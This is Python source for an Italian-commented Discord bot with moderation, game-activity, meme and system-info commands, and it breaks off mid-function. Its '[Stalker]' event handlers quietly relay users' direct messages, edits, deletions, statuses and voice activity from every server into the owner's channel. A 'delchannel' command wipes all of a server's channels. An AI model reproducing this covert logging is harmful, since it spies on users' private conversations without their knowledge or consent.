import discord
from discord.ext import commands, tasks
from discord_together import DiscordTogether
from random import choice

from discord.utils import get
from discord.ext.commands import has_permissions, CheckFailure, NoPrivateMessage
import random
import json
import os
import asyncio
import psutil

import aiohttp

import requests
from requests import get
import json

with open("config.json") as f:
    try:
        data = json.load(f)
    except json.decoder.JSONDecodeError as e:
        print("Errore in config.json")
        print(e)
        exit(1)

my_id = 598119406731657216
is_me = commands.check(lambda ctx: ctx.author.id == my_id)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.presences = True
intents.reactions = True

pre = data["command_prefix"]
client = commands.Bot(command_prefix=(pre), intents=intents, case_insensitive=True)
client.remove_command('help')

#dati generali
footer_testo = data["footer_embed"]
stalkid = 1045020366751404172
errorchannel = 1046796347870826496


@client.event
async def on_ready():
	change_status.start()
	client.sync_commands(force=True)
	print(f"Bot logged into {client.user}.")
	token_json = data["discord_token"]
	client.togetherControl = await DiscordTogether(token_json)


#messaggi inizio

@client.event
async def on_message(message):
	if message.author.bot:
		return
	if message.channel.type == discord.ChannelType.private:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio inviato\nUtente: `{message.author.display_name}#{message.author.discriminator}`\nDm: `Yes`", color=discord.Color.green())
		embed.add_field(name = 'Contenuto:', value=f"`{message.content}`", inline = True)
		await channel.send(embed=embed)
		await client.process_commands(message) 
	else:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio inviato\nUtente: `{message.author.display_name}#{message.author.discriminator}`\n Server: `{message.guild.name}`", color=discord.Color.green())
		embed.add_field(name = 'Contenuto:', value=f"`{message.content}`", inline = True)
		embed.add_field(name = 'Canale:', value=f"<#{message.channel.id}>", inline = True)
		await channel.send(embed=embed)
		await client.process_commands(message)


@client.event
async def on_message_delete(message):
	if message.author.bot:
		return
	if message.channel.type == discord.ChannelType.private:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio Eliminato\nUtente: `{message.author.display_name}#{message.author.discriminator}`\n Dm: `Yes`", color=discord.Color.red())
		embed.add_field(name = 'Contenuto:', value=f"`{message.content}`", inline = True)
		await channel.send(embed=embed)
	else:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio Eliminato\nUtente: `{message.author.display_name}#{message.author.discriminator}`\n Server: `{message.guild.name}`", color=discord.Color.red())
		embed.add_field(name = 'Contenuto:', value=f"`{message.content}`", inline = True)
		embed.add_field(name = 'Canale:', value=f"<#{message.channel.id}>", inline = True)
		await channel.send(embed=embed)

@client.event
async def on_message_edit(before, after):
	if after.author.bot:
		return
	if after.channel.type == discord.ChannelType.private:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio Editato\nUtente: `{after.author.display_name}#{after.author.discriminator}`\nDm: `Yes`", color=discord.Color.gold())
		embed.add_field(name = 'Contenuto:', value=f"Prima: `{before.content}`, Dopo: `{after.content}`", inline = True)
		await channel.send(embed=embed)
		await client.process_commands(after)
	else:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nMessagio Editato\nUtente: `{after.author.display_name}#{after.author.discriminator}`\n Server: `{after.guild.name}`", color=discord.Color.gold())
		embed.add_field(name = 'Contenuto:', value=f"Prima: `{before.content}`, Dopo: `{after.content}`", inline = True)
		embed.add_field(name = 'Canale:', value=f"<#{after.channel.id}>", inline = True)
		await channel.send(embed=embed)
		await client.process_commands(after)



#messaggi fine



#eventi server


#membri
'''
@client.event
async def on_member_ban(guild, user):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nUtente bannato\nUtente: `{user.display_name}#{user.discriminator}`\n Server: `{guild.name}`", color=discord.Color.red())


@client.event
async def on_member_unban(guild, user):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nUtente sbannato\nUtente: `{user.display_name}#{user.discriminator}`\n Server: `{guild.name}`", color=discord.Color.red())
'''


@client.event
async def on_member_remove(member):
	guild = member.guild
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nMembro rimosso / quit\nUtente: `{member.display_name}#{member.discriminator}`\n Server: `{member.guild.name}`", color=discord.Color.red())
	await channel.send(embed=embed)

@client.event
async def on_member_join(member):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nNuovo utente nel server\nUtente: `{member.display_name}#{member.discriminator}`\n Server: `{member.guild.name}`", color=discord.Color.orange())
	await channel.send(embed=embed)
	await member.create_dm()
	embed = discord.Embed(title=f"Hi {member.name}, welcome to {member.guild}!", color=discord.Color.orange())
	await member.dm_channel.send(embed=embed)




@client.event
async def on_member_update(before, after):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\n Server: `{after.guild.name}`", color=discord.Color.purple())
	embed.add_field(name = 'Status:', value=f"Prima: `{before.status}`, Dopo: `{after.status}`", inline = False)
	embed.add_field(name = 'Nome:', value=f"Prima: `{before.name}`, Dopo: `{after.name}`", inline = False)
	embed.add_field(name = 'Avatar:', value=f"Prima: [Url]({before.avatar}), Dopo: [Url]({after.avatar})", inline = False) 
	embed.add_field(name = 'Attività:', value=f"Prima: `{before.activity}`, Dopo: `{after.activity}`", inline = False)
	embed.add_field(name = 'Avvertenza:', value=f":warning: se Alcune informazioni non cambiano :warning:\n:warning: Significa che sono le stesse :warning:", inline = False)
	await channel.send(embed=embed)

@client.event
async def on_voice_state_update(member, before, after):
	if before.channel is None and after.channel is not None:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nUtente in Chat vocale\nUtente: `{member.display_name}#{member.discriminator}`\nServer: `{member.guild.name}`", color=discord.Color.blue())
		embed.add_field(name = 'Canale:', value=f"<#{after.channel.id}>", inline = True)
		await channel.send(embed=embed)
	if before.channel is not None and after.channel is None:
		channel = client.get_channel(stalkid)
		embed = discord.Embed(title=f"**[Stalker]**\nUtente in Chat vocale\nUtente: `{member.display_name}#{member.discriminator}`\nServer: `{member.guild.name}`", color=discord.Color.red())
		embed.add_field(name = 'Canale:', value=f"<#{before.channel.id}>", inline = True)
		await channel.send(embed=embed)

#ruoli

@client.event
async def on_guild_role_delete(role):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nRuolo eliminato\nServer: `{role.guild.name}`", color=discord.Color.red())
	embed.add_field(name = 'Nome:', value=f"`{role.name}`", inline = True)

@client.event
async def on_guild_role_update(before, after):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nUpdate ruolo\nServer: `{before.guild.name}`", color=discord.Color.gold())
	embed.add_field(name = 'Nome:', value=f"Prima: `{before.name}` Dopo:  `{after.name}`", inline = False)
	embed.add_field(name = 'Avvertenza:', value=f":warning: se il nome non cambio sono i permessi :warning:\n:warning: per mancata voglia non sono stati inseriti :warning:", inline = True)
	await channel.send(embed=embed)

@client.event
async def on_guild_role_create(role):
	channel = client.get_channel(stalkid)
	embed = discord.Embed(title=f"**[Stalker]**\nRuolo creato\nServer: `{role.guild.name}`", color=discord.Color.green())
	embed.add_field(name = 'Nome:', value=f"`{role.name}`", inline = True)
	await channel.send(embed=embed)

#fine eventi server



@client.command()
@commands.guild_only()
async def userinfo(ctx, *, user: discord.Member = None):
	voice_state = None if not user.voice else user.voice.channel
	role = user.top_role.name
	if role == "@everyone":
		role = "N/A"
	embed = discord.Embed(title=f"***User*** - Info", color=discord.Colour.blue())
	embed.add_field(name=':id: - User ID', value=f"{user.id}", inline=False)
	embed.add_field(name=':bust_in_silhouette: - User Name', value=f"{user.name}#{user.discriminator}", inline=False)
	#embed.add_field(name=':bust_in_silhouette: - User Nick', value=f"{user.display_name}", inline=False)
	#embed.add_field(name=':radio_button: - User Status', value=f"**{user.status}**", inline=False)
	#embed.add_field(name=':video_game: - User Game', value=f"**{user.activity}**", inline=False)
	embed.add_field(name=':robot: - Robot?', value=f"**{user.bot}**", inline=False)
	embed.add_field(name=':loud_sound:  - Is in voice', value=f"**In:** **{voice_state}**", inline=False)
	embed.add_field(name=':radio_button:  - Highest Role', value=f"**{role}**", inline=False)
	embed.add_field(name=':calendar: - Account Created', value=user.created_at.__format__('***Date:*** %A, %d. %B %Y ***Time:*** %H:%M:%S'), inline=False)
	embed.add_field(name=':calendar: - Join Server Date', value=user.joined_at.__format__('***Date:*** %A, %d. %B %Y ***Time:*** %H:%M:%S'), inline=False)
	embed.set_thumbnail(url=user.avatar)
	embed.set_footer(text=footer_testo)
	await ctx.send(embed=embed)







@client.command()
@commands.guild_only()
@commands.has_permissions(manage_channels = True)
async def lockdown(ctx):
	await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False, view_channel=False)
	await ctx.send(ctx.channel.mention + " ***is now in lockdown.*** :lock:")   
    #embed = discord.Embed(title=ctx.channel.mention + " ***is now in lockdown.*** :lock:", color=discord.Color.red())
    #await ctx.send(embed)

@client.command()
@commands.guild_only()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
	await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True, view_channel=True)
	await ctx.send(ctx.channel.mention + " ***has been unlocked.*** :unlock:")   
	#embed = discord.Embed(title=ctx.channel.mention + " ***has been unlocked.*** :unlock:", color=discord.Color.red())
	#await ctx.send(embed)




@client.command()
@commands.guild_only()
@commands.has_permissions(manage_messages=True)
async def nuke(ctx, amount=100):
        embed = discord.Embed(title=f"{amount} messages deleted", color=discord.Color.red())
        embed.set_image(url="https://www.19fortyfive.com/wp-content/uploads/2021/10/Nuclear-Weapons-Test.jpg")
        await ctx.channel.purge(limit=amount + 1)
        embed.set_footer(text=footer_testo)  
        await ctx.send(embed=embed, delete_after=4)

@client.command()
@commands.guild_only()
async def activity(ctx, id=None):
        utilmax = 5
        if ctx.author.voice is None:
                await ctx.send("Please enter in a voice channel to use this command")
        else:
                if id == "1":
                        link1 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'sketch-heads', max_uses = utilmax)
                        await ctx.send(f"**Sketch Heads** - {link1}")
                if id == "2":
                        link2 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'chess', max_uses = utilmax)
                        await ctx.send(f"**Chess in the Park** - {link2}")
                if id == "3":
                        link3 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'land-io', max_uses = utilmax)
                        await ctx.send(f"**Land.io** - {link3}")
                if id == "4":
                        link4 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'spellcast', max_uses = utilmax)
                        await ctx.send(f"**Spell Cast** - {link4}")
                if id == "5":
                        link5 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'blazing-8s', max_uses = utilmax)
                        await ctx.send(f"**Blazing 8s** - {link5}")
                if id == "6":
                        link6 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'poker', max_uses = utilmax)
                        await ctx.send(f"**Poker Night** - {link6}")
                if id == "7":
                        link7 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'letter-league', max_uses = utilmax)
                        await ctx.send(f"**Letter League** - {link7}")
                if id == "8":
                        link8 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'bobble-league', max_uses = utilmax)
                        await ctx.send(f"**Bobble League** - {link8}")
                if id == "9":
                        link9 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'checkers', max_uses = utilmax)
                        await ctx.send(f"**Checkers in the Park** - {link9}")
                if id == "10":
                        link10 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'awkword', max_uses = utilmax)
                        await ctx.send(f"**Awword** - {link10}")
                if id == "11":
                        link11 = await client.togetherControl.create_link(ctx.author.voice.channel.id, '976052223358406656', max_uses = utilmax)
                        await ctx.send(f"**Ask Away** - {link11}")
                if id == "12":
                        link12 = await client.togetherControl.create_link(ctx.author.voice.channel.id, '976052223358406656', max_uses = utilmax)
                        await ctx.send(f"**Know what I Meme** - {link12}")
                if id == "13":
                        link13 = await client.togetherControl.create_link(ctx.author.voice.channel.id, 'youtube')
                        await ctx.send(f"**Watch Together** - {link13}")
                if id == "14":
                        link14 = await client.togetherControl.create_link(ctx.author.voice.channel.id, '1006584476094177371')
                        await ctx.send(f"**Bash Out** - {link14}")
                elif id == None:
                        embed = discord.Embed(title="Activity List", color=discord.Color.gold())
                        embed.add_field(name="Boosted activity\n1 = Sketch Heads\n2 = Chess in the Park\n3 = Land.io\n4 = Spell Cast\n5 = Blazing 8s\n6 = Poker Night\n7 = Letter League\n8 = Booble League\n9 = Checkers in the Park\n10 = Awkword\n11 = Ask Away\n14 = Bash Out", value="Free Activity\n12 = Know what I Meme\n 13 = Watch Together")
                        embed.set_footer(text=footer_testo)    
                        await ctx.send(embed=embed)
                else:
                        embed = discord.Embed(title="Activity List", color=discord.Color.gold())
                        embed.add_field(name="Boosted activity\n1 = Sketch Heads\n2 = Chess in the Park\n3 = Land.io\n4 = Spell Cast\n5 = Blazing 8s\n6 = Poker Night\n7 = Letter League\n8 = Booble League\n9 = Checkers in the Park\n10 = Awkword\n11 = Ask Away\n14 = Bash Out", value="Free Activity\n12 = Know what I Meme\n 13 = Watch Together")
                        embed.set_footer(text=footer_testo)    
                        await ctx.send(embed=embed)
                       




@client.command()
@commands.guild_only()
async def serverinfo(ctx):
	embed = discord.Embed(title=f"***{ctx.guild.name}*** - Info", description="Information of this Server", color=discord.Colour.blue())
	embed.add_field(name=':page_facing_up: - Name', value=f'{str(ctx.guild.name)} Server Name', inline=False)
	embed.add_field(name=':bookmark_tabs: - Description', value=f'{str(ctx.guild.description)} Server Description', inline=False)
	embed.add_field(name=':id: - Server ID', value=f"{ctx.guild.id}", inline=False)
	embed.add_field(name=':calendar: - Created On', value=ctx.guild.created_at.strftime("%b %d %Y"), inline=False)
	embed.add_field(name=':crown: - Owner', value=f"<@{ctx.guild.owner_id}>", inline=False)
	embed.add_field(name=':busts_in_silhouette: - Members', value=f'{ctx.guild.member_count} Members', inline=False)
	embed.add_field(name=':speech_balloon: - Channels', value=f'{len(ctx.guild.text_channels)} Text | {len(ctx.guild.voice_channels)} Voice | {len(ctx.guild.forum_channels)} Forum', inline=False)
	embed.add_field(name=':open_file_folder: - Category', value=f'{len(ctx.guild.categories)} Category', inline=False)
	embed.add_field(name=':bust_in_silhouette: - Role', value=f'{len(ctx.guild.roles)} Role count', inline=False)
	embed.set_footer(text=footer_testo)    
	await ctx.send(embed=embed)

 

#test
@client.command()
async def meme(ctx):
		embed = discord.Embed(title="Meme", color=discord.Colour.green())
		async with aiohttp.ClientSession() as cs:
			async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
				res = await r.json()
				embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
				embed.set_footer(text=footer_testo)  
				await ctx.send(embed=embed)

'''
@client.command()
async def meme(ctx):
    data = requests.get('https://meme-api.herokuapp.com/gimme').json()
    meme = discord.Embed(title=f"{data['title']}", Color = discord.Colour.green().set_image(url=f"{data['url']}"))
    await ctx.send(embed=meme)
'''

@client.event
async def on_reaction_add(reaction, user):
	ctx = reaction
	if reaction.emoji == "<:checkmark_2714fe0f:1073342463995023433>":
		if discord.utils.get(ctx.guild.roles, name="verify"):
			#if get(message.guild.roles, name="verify"):
			role = discord.utils.get(ctx.guild.roles, name="verify")
			pearson = reaction.user
			await pearson.add_roles(role)
			embed_verify=discord.Embed(title=f"You are now verify")
			embed_verify.set_footer(text=footer_testo)  
			await pearson.send(embed=embed_verify)
		else:
			permissions = discord.Permissions(send_messages=True, read_messages=True)
			guild = ctx.guild
			await guild.create_role(name="verify", colour=discord.Colour(0x00ff00), permissions=permissions)
			role = discord.utils.get(ctx.guild.roles, name="verify")
			for channel in ctx.guild.channels:
				permissions = discord.PermissionOverwrite(send_messages=False, read_messages=True, speak=False)
				await channel.set_permissions(role, overwrite=permissions)
			await reaction.user.add_roles(role)
	else:
		print("errore")


@client.command()
async def verify(ctx):
	#reactions = ['✅'] # add more later if u want idk
	embed = discord.Embed(title="Click the button with <:checkmark_2714fe0f:1073342463995023433> to verify", color=discord.Color.green())
	embed.set_footer(text=footer_testo)
	message = await ctx.send(embed=embed)
	await message.add_reaction("<:checkmark_2714fe0f:1073342463995023433>")




@client.command()
@commands.guild_only()
async def unmute(ctx, user: discord.Member = None):
	if ctx.message.author.guild_permissions.administrator:
		if user == None:
			embed = discord.Embed(title="Please send the user id", color=discord.Color.red())
			embed.set_footer(text=footer_testo)
			await ctx.send(embed=embed)
		else:
			role = discord.utils.get(ctx.guild.roles, name="mute")
			await user.remove_roles(role)
			embed = discord.Embed(title = 'I unmuted', description = f'{user}', color=discord.Color.blue())
			embed.set_footer(text=footer_testo)
			await ctx.send(embed=embed)
	else:
		embed = discord.Embed(title="Error: You need the permission to use this command", color=discord.Color.red())
		embed.set_footer(text=footer_testo)
		await ctx.send(embed=embed, delete_after=4)

@client.command()
@commands.guild_only() 
async def mute(ctx, user: discord.Member = None, reason = None):
    if ctx.message.author.guild_permissions.administrator:
        #channel1 = ctx.guild.channels
        permissions = discord.Permissions(send_messages=False, read_messages=True, speak=False)
        if user == None:
            embed = discord.Embed(title="Please send the user id", color=discord.Color.red())
            embed.set_footer(text=footer_testo)
            await ctx.send(embed=embed)
        else:
                guild = ctx.guild
                if discord.utils.get(ctx.guild.roles, name="mute"):
                    if reason == None:
                        role = discord.utils.get(ctx.guild.roles, name="mute")
                        guild = ctx.guild
                        for channel in ctx.guild.channels:
                            permissions = discord.PermissionOverwrite(send_messages=False, read_messages=True, speak=False)
                            await channel.set_permissions(role, overwrite=permissions)
                        await user.add_roles(role)
                        embed = discord.Embed(title = 'I muted', description = f'{user}', color=discord.Color.blue())
                        embed.set_footer(text=footer_testo)
                        await ctx.send(embed=embed)
                        name = str(ctx.guild.name)
                        await user.send(f"You have been muted in the server: **{name}**")
                        #await asyncio.sleep(time*60)
                        #await user.remove_roles(role)
                    else:
                        role = discord.utils.get(ctx.guild.roles, name="mute")
                        guild = ctx.guild
                        for channel in ctx.guild.channels:
                            permissions = discord.PermissionOverwrite(send_messages=False, read_messages=True, speak=False)
                            await channel.set_permissions(role, overwrite=permissions)
                        await user.add_roles(role)
                        embed = discord.Embed(title = f'I muted {user}', description = f'For reason: {reason}', color=discord.Color.blue())
                        embed.set_footer(text=footer_testo)
                        await ctx.send(embed=embed)
                        name = str(ctx.guild.name)
                        await user.send(f"You have been muted in the server: **{name}** because:\n{reason}")
                        #await asyncio.sleep(time*60)
                        #await user.remove_roles(role)
                else:
                    if reason == None:
                        role = discord.utils.get(ctx.guild.roles, name="mute")
                        permissions = discord.Permissions(send_messages=False, read_messages=True, speak=False)
                        await guild.create_role(name="mute", colour=discord.Colour(0x444949), permissions=permissions)
                        guild = ctx.guild
                        for channel in ctx.guild.channels:
                            permissions = discord.PermissionOverwrite(send_messages=False, read_messages=True, speak=False)
                            await channel.set_permissions(role, overwrite=permissions)
                        await user.add_roles(role)
                        embed = discord.Embed(title = 'I muted', description = f'{user}', color=discord.Color.blue())
                        embed.set_footer(text=footer_testo)
                        await ctx.send(embed=embed)
                        name = str(ctx.guild.name)
                        await user.send(f"You have been muted in the server: **{name}**")
                        #await asyncio.sleep(time*60)
                        #await user.remove_roles(role)
                    else:
                        role = discord.utils.get(ctx.guild.roles, name="mute")
                        permissions = discord.Permissions(send_messages=False, read_messages=True, speak=False)
                        await guild.create_role(name="mute", colour=discord.Colour(0x444949), permissions=permissions)
                        for channel in ctx.guild.channels:
                            permissions = discord.PermissionOverwrite(send_messages=False, read_messages=True, speak=False)
                            await channel.set_permissions(role, overwrite=permissions)
                        await user.add_roles(role)
                        embed = discord.Embed(title = f'I muted {user}', description = f'For reason: {reason}', color=discord.Color.blue())
                        embed.set_footer(text=footer_testo)
                        await ctx.send(embed=embed)
                        name = str(ctx.guild.name)
                        await user.send(f"You have been muted in the server: **{name}** because:\n{reason}")
                        #await asyncio.sleep(time*60)
                        #await user.remove_roles(role)
    else:
        embed = discord.Embed(title="Error: You need the permission to use this command", color=discord.Color.red())
        embed.set_footer(text=footer_testo)
        await ctx.send(embed=embed, delete_after=4)

@client.command()
@commands.guild_only()
@has_permissions(kick_members=True)
async def kick(ctx, member : discord.Member, *, reason = None):
	if member == None:
		embed = discord.Embed(title=":warning: Please write the member's ID :warning:", color=discord.Color.red())
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif reason == None:
		if member == None:
			embed = discord.Embed(title=":warning: Please write the member's ID :warning:", color=discord.Color.red())
			embed.set_footer(text=footer_testo)  
			await ctx.send(embed=embed)
		else:
			#embed2 = discord.Embed(title=f"You have been kicked from the server: {ctx.guild.name}", color=discord.Color.red())
			#embed2.set_footer(text=footer_testo)
			#await member.send(embed2)
			await member.send(f"You have been kicked from the server: {ctx.guild.name}")
			embed = discord.Embed(title=":warning: Member was kicked :warning:", color=discord.Color.red())
			embed.set_footer(text=footer_testo)  
			await ctx.send(embed=embed)
			await member.kick(reason=f"You have been banned from the server: {ctx.guild.name}")
	else:
		#embed2 = discord.Embed(title=f"You have been kicked from the server: {ctx.guild.name}, For: '{reason}'", color=discord.Color.red())
		#embed2.set_footer(text=footer_testo)
		#await member.send(embed2)
		await member.send(f"You have been kicked from the server: {ctx.guild.name}, For: '{reason}'")
		embed = discord.Embed(title=":warning: Member was kicked :warning:", color=discord.Color.red())
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
		await member.kick(reason=f"You have been kicked from the server: {ctx.guild.name}, For: '{reason}'")

@client.command()
@commands.guild_only()
@has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member, *, reason = None):
	if member == None:
		embed = discord.Embed(title=":warning: Please write the member's ID :warning:", color=discord.Color.red())
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif reason == None:
		if member == None:
			embed = discord.Embed(title=":warning: Please write the member's ID :warning:", color=discord.Color.red())
			embed.set_footer(text=footer_testo)  
			await ctx.send(embed=embed)
		else:
			#embed2 = discord.Embed(title=f"You have been banned from the server: {ctx.guild.name}", color=discord.Color.red())
			#embed2.set_footer(text=footer_testo)
			#await member.send(embed2)
			await member.send(f"You have been banned from the server: {ctx.guild.name}")
			embed = discord.Embed(title=":warning: Member was banned :warning:", color=discord.Color.red())
			embed.set_footer(text=footer_testo)  
			await ctx.send(embed=embed)
			await member.ban(reason=f"You have been banned from the server: {ctx.guild.name}")
	else:
		#embed2 = discord.Embed(title=f"You have been banned from the server: {ctx.guild.name}/nFor: '{reason}'", color=discord.Color.red())
		#embed2.set_footer(text=footer_testo)
		#await member.send(embed2)
		await member.send(f"You have been banned from the server: {ctx.guild.name}/nFor: '{reason}'")
		embed = discord.Embed(title=":warning: Member was banned :warning:", color=discord.Color.red())
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
		await member.ban(reason=f"You have been banned from the server: {ctx.guild.name}, For: '{reason}'")





@client.command()
@commands.guild_only()
@has_permissions(administrator = True)
async def delchannel(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()

@client.command()
@commands.guild_only()
@has_permissions(ban_members=True)
async def unban(ctx, user: discord.User):
	await ctx.guild.unban(user)
	embed = discord.Embed(title=f":warning: {user.mention} has been unbanned :warning:", color=discord.Color.red())
	embed.set_footer(text=footer_testo)  
	await ctx.send(embed=embed)

@client.command()
@commands.guild_only()
async def casual(ctx):
	list1 = ["yes", "no"]
	r = random.choice(list1)
	embed = discord.Embed(title=f"{r}", color=discord.Color.blue())
	embed.set_footer(text=footer_testo)  
	await ctx.send(embed=embed)

@client.command()
@commands.guild_only()
async def coinflip(ctx):
	coin = ['heads  :coin:','tails  :coin:']
	r = random.choice(coin)
	link = 'https://i.pinimg.com/originals/d7/49/06/d74906d39a1964e7d07555e7601b06ad.gif'
	#link = 'https://cdn-icons-png.flaticon.com/512/1540/1540515.png'
	embed = discord.Embed(title=f"It came up {r}", color=discord.Color.gold())
	embed.set_image(url=link)
	embed.set_footer(text=footer_testo)  
	await ctx.send(embed=embed)

@client.command()
@commands.guild_only()
async def num_extractor(ctx):
	number = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
	r = random.choice(number)
	embed = discord.Embed(title=f"Is out", color=discord.Color.blue())
	embed.add_field(name = 'Number', value = f'{r}')
	embed.set_footer(text=footer_testo)  
	await ctx.send(embed=embed)

'''
@client.command()
async def cayo(ctx):
	tlista = data["gente_cayo"]
	lista = f"{tlista}"
	#lista = f"1 = Bicche\n3 = \n4 = Minifrizz\n5 = Kappa\n6 = \n7 = Marcellogino\n8 = SJ_Anto"
	list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
	r = random.choice(list1)
	embed = discord.Embed(title=lista, color=discord.Color.red())
	await ctx.send(embed=embed)
	link = 'https://yt3.ggpht.com/aEPu_BKyaGhlIlO7l9GPUOrB4lYoAn3YvL5q8QYnFERBo4n9BjY5X3cswLT8nPxS28U1fnmsPA=s176-c-k-c0x00ffffff-no-rj'
	if r == 1:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		await ctx.send(embed=embed)
		embed.set_footer(text=footer_testo)  
	elif r == 2:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 3:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 4:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 4:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 5:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 6:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 7:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	elif r == 8:
		embed = discord.Embed(title=f"È uscito il numero {r}", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)
		await ctx.send(embed=embed)
	elif r == 9:
		embed = discord.Embed(title=f"È uscito il numero {r} niente", color=discord.Color.green())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)
		await ctx.send(embed=embed)
	elif r == 10:
		embed = discord.Embed(title=f"È uscito il numero {r} si rigira", color=discord.Color.green())
		embed.set_footer(text=footer_testo)
		embed.set_image(url=link)
		await ctx.send(embed=embed)
	elif r == 11:
		list2 = [1, 2, 3, 4, 5, 6, 7, 8]
		r2 = random.choice(list2)
		embed = discord.Embed(title=f"👑\n\nÈ uscito il numero {r2} che vince 2 colpi", color=discord.Color.gold())
		embed.set_image(url=link)
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
	else:
		embed = discord.Embed(title=f"errore, N = {r}", color=discord.Color.red())
		embed.set_footer(text=footer_testo)  
		await ctx.send(embed=embed)
'''


@client.command()
@commands.guild_only()
@is_me #solo se è il mio id
async def update(ctx):
	embed = discord.Embed(title="Reloading system...", color=0x2c2f33)
	embed.set_image(url="https://support.discord.com/hc/en-us/article_attachments/206303208/eJwVyksOwiAQANC7sJfp8Ke7Lt15A0MoUpJWGmZcGe-ubl_eW7zGLmaxMZ80A6yNch-rJO4j1SJr73Uv6Wwkcz8gMae8HeXJBOjC5NEap42dokUX_4SotI8GVfBaYYDldr3n3y_jomRtD_H5ArCeI9g.zGz1JSL-9DXgpkX_SkmMDM8NWGg.gif")
	embed.add_field(name = '**System info**', value = f':gear:', inline = False)
	embed.add_field(name = ':computer: **CPU Usage**', value = f'{psutil.cpu_percent()}%', inline = False)
	embed.add_field(name = ':floppy_disk: **Memory Usage**', value = f'{psutil.virtual_memory().percent}%', inline = False)
	embed.add_field(name = ':floppy_disk: **Available Memory**', value = f'{psutil.virtual_memory().available * 100 / psutil.virtual_memory().total}%', inline = False)
	embed.add_field(name = ':globe_with_meridians: **Ping**', value = f'{round(client.latency * 1000)}ms')
	await ctx.send(embed=embed, delete_after=7)
	exit()

@client.command()
@commands.guild_only()
async def infobot(ctx):
	embed = discord.Embed(title = 'System Resource Usage', description = 'See CPU and memory usage of the system.', color=discord.Color.blue())
	embed.add_field(name = ':computer: **CPU Usage**', value = f'{psutil.cpu_percent()}%', inline = False)
	embed.add_field(name = ':floppy_disk: **Memory Usage**', value = f'{psutil.virtual_memory().percent}%', inline = False)
	embed.add_field(name = ':floppy_disk: **Available Memory**', value = f'{psutil.virtual_memory().available * 100 / psutil.virtual_memory().total}%', inline = False)
	embed.add_field(name = ':globe_with_meridians: **Ping**', value = f'{round(client.latency * 1000)}ms')
	await ctx.send(embed = embed)

#applicationcommand

@client.message_command(name="Get Message ID")  # creates a global message command. use guild_ids=[] to create guild-specific commands.
async def get_message_id(ctx, message: discord.Message):  # message commands return the message
    await ctx.respond(f"Message ID: `{message.id}`", ephemeral=True)

#chat-gòt start
import openai

openai.api_key = data["GPT-KEY"]

@client.message_command(name="Chat-GPT this Message")
async def chat_gpt(ctx, message: discord.Message):
	test2 = message
	model_engine = "text-davinci-003"
	completion = openai.Completion.create(
		engine=model_engine,
		prompt=test2,
